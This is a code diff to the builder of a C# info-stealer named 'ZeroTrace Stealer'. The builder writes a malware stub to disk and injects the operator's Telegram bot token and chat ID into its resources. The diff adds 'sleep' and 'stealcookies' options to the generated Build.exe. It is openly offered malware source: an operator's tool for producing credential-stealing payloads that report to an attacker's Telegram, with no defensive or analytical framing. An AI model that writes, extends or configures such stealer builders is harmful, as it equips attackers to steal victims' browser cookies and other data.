@@ -46,20 +46,54 @@ namespace ZeroTrace_Stealer
             }
         }
 
+
         private void simpleButton1_Click(object sender, EventArgs e)
         {
+            // TELEGRAM
             try
             {
                 byte[] telegram = Properties.Resources.ZeroTelegram;
                 File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe", telegram);
                 Thread.Sleep(1000);
-                ZeroTrace.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, "Build.exe");
+
+
+              
+                string sleep = checkEdit1.Checked ? "true" : "false";
+
+                string stealcookies = checkEdit2.Checked ? "true" : "false";
+
+          
+          
+
+                // put them there : 
+                try
+
+                {
+                    ZeroTrace.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, sleep, stealcookies, "Build.exe");
+                }
+                catch
+                {
+                    ZeroTrace.Builder.Build.ModifytelegramAssembly(textEdit1.Text, textEdit4.Text, sleep, stealcookies, "Build.exe");
+                }
+
                 Thread.Sleep(1000);
 
 
                 MessageBox.Show(" { Build Success ! } : " + Environment.CurrentDirectory + "\\Build.exe", "Success!");
 
-                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe");
+                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ZeroStubTelegram.exe";
+                if (File.Exists(filePath))
+                {
+                    try
+                    {
+                        File.Delete(filePath);
+                    }
+                    catch (IOException ex)
+                    {
+                        MessageBox.Show("Error deleting file: " + ex.Message, "Error");
+                    }
+                }
+
 
             }
 
@@ -85,7 +119,13 @@ namespace ZeroTrace.Builder
             if (!File.Exists(stubPath))
                 throw new FileNotFoundException("Stub file not found.", stubPath);
 
-            return AssemblyDefinition.ReadAssembly(stubPath);
+            using (var stream = new FileStream(stubPath, FileMode.Open, FileAccess.Read, FileShare.Read))
+            {
+                var memoryStream = new MemoryStream();
+                stream.CopyTo(memoryStream);
+                memoryStream.Position = 0; // Reset position to the beginning of the stream
+                return AssemblyDefinition.ReadAssembly(memoryStream);
+            }
         }
 
         private static void WriteStub(AssemblyDefinition definition, string outputPath)
@@ -121,15 +161,20 @@ namespace ZeroTrace.Builder
 
         }
 
-        public static void UpdateIPAndPortTelegram(string token, string chatid, AssemblyDefinition assembly)
+        public static void UpdateIPAndPortTelegram(string token, string chatid, string sleep, string stealcookies , AssemblyDefinition assembly)
         {
             // Remove and add the IP and Port resources
             UpdateResource("DestinyClient.Resources.token.txt", token, assembly);
             UpdateResource("DestinyClient.Resources.chatid.txt", chatid, assembly);
+            UpdateResource("DestinyClient.Resources.sleep.txt", sleep, assembly);
+            UpdateResource("DestinyClient.Resources.stealcookies.txt", stealcookies, assembly);
+
+
+
 
         }
 
-        public static void ModifytelegramAssembly(string token, string chatid, string outputPath)
+        public static void ModifytelegramAssembly(string token, string chatid, string sleep, string stealcookies,  string outputPath)
         {
             try
             {
@@ -141,7 +186,7 @@ namespace ZeroTrace.Builder
                 var assembly = ReadStub(stubPath);
 
                 // Update the IP and Port resources
-                UpdateIPAndPortTelegram(token, chatid, assembly);
+                UpdateIPAndPortTelegram(token, chatid, sleep, stealcookies, assembly);
 
 
                 // Write the modified assembly to a file
